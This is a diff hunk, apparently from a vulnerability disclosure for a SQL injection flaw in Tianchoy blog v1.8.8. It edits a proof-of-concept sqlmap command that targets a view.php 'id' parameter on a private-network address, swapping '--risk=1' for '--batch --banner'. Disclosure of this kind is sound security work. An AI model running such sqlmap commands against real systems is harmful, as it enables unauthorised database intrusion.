@@ -34,6 +34,6 @@ Tianchoy blog v1.8.8 was discovered to contain a SQL Injection vulnerability via
 
 sqlmap:
 ```
-sqlmap -u "http://192.168.0.183:11180/view.php?id=1"  --risk=1
+sqlmap -u "http://192.168.0.183:11180/view.php?id=1"  --batch --banner
 
 ```
